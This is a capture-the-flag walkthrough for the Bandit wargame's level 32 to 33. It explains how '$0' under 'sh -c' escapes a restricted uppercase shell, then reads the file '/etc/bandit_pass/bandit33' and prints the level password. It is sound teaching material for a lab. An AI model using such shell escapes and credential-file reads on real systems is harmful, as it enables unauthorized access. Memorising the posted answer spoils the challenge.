# Bandit Level 32 -> Level 33

After all this git stuff its time for another escape. Good luck!

```console
WELCOME TO THE UPPERCASE SHELL
>>
```

# `sh`

bash - GNU Bourne-Again SHell

Bash is an `sh`-compatible command language interpreter that executes commands read from the standard input or from a file. Bash also incorporates useful features from the Korn and C shells (`ksh` and `csh`).

Bash is intended to be a conformant implementation of the Shell and Utilities portion of the IEEE POSIX specification (IEEE Standard 1003.1). Bash can be configured to be POSIX-conformant by default.

If arguments remain after option processing, and neither the -c nor the -s option has been supplied, the first argument is assumed to be the name of a file containing shell commands. If bash is invoked in this fashion, `$0` is set to the name of the file, and the positional parameters are set to the remaining arguments.

# [Positional arguments of script](https://stackoverflow.com/a/29258643)

`./script.sh hello world`

1. `$0` = `./script.sh`
1. `$1` = `hello`
1. `$2` = `world`

If you execute ./script.sh, `$0` will give output `./script.sh` but if you execute it with `bash script.sh` it will give output `script.sh`.

# [$0 expands to the name of the shell script, so the first shell we have is called uppercase, so if we do $0 wouldnt that just spawn another "uppercase" shell](https://www.reddit.com/r/hacking/comments/dxe2c2/bandit_level_32_explained_pls_overthewire/)

If the UPPERCASE shell was started with

`sh uppercase_shell.sh` then `$0` would be `uppercase_shell.sh`!

```console
PM_ME_YOUR_SHELLCODE@localhost:/tmp$ echo 'echo $0' > uppercase_shell.sh
PM_ME_YOUR_SHELLCODE@localhost:/tmp$ sh uppercase_shell.sh
uppercase_shell.sh
```

Same if we instead execute it as an executable and not a script

```console
PM_ME_YOUR_SHELLCODE@localhost:/tmp$ printf '#!/bin/sh\necho $0' > uppercase_shell.sh
PM_ME_YOUR_SHELLCODE@localhost:/tmp$ chmod +x uppercase_shell.sh
PM_ME_YOUR_SHELLCODE@localhost:/tmp$ ./uppercase_shell.sh
./uppercase_shell.sh
```

However, the UPPERCASE shell on `Bandit` isn't a shell script but a binary executable.

In its code, there is something like this:

```
# Not valid code, just an example
while (true) {
    print(">> ");
    cmd = makeUppercase(readInput());
    print(execute("sh", "-c", cmd));
}
```

`-c` option passed to `sh` causes the commands to be read from `cmd` (argument given after `-c`)

This will create a situation where the scriptname being executed is the shell itself `sh` in this case!

```console
PM_ME_YOUR_SHELLCODE@localhost:/tmp$ sh -c 'echo $0'
sh
```

So trying to execute `$0` will spawn a shell

```console
PM_ME_YOUR_SHELLCODE@localhost:/tmp$ sh -c '$0'
sh-4.3$
```

# Command to execute

```console
WELCOME TO THE UPPERCASE SHELL
>> ls
sh: 1: LS: not found
>> $0
$ ls
uppershell
$ file uppershell
uppershell: setuid ELF 32-bit LSB executable, Intel 80386, version 1 (SYSV), dynamically linked, interpreter /lib/ld-linux.so.2, for GNU/Linux 2.6.32, BuildID[sha1]=e6a8ed571599ce2bfa8b77145dbfc4eb933c1477, not stripped

$ cat /etc/bandit_pass/bandit33
c9c3199ddf4121b10cf581a98d51caee
```

# PASSWORD

c9c3199ddf4121b10cf581a98d51caee
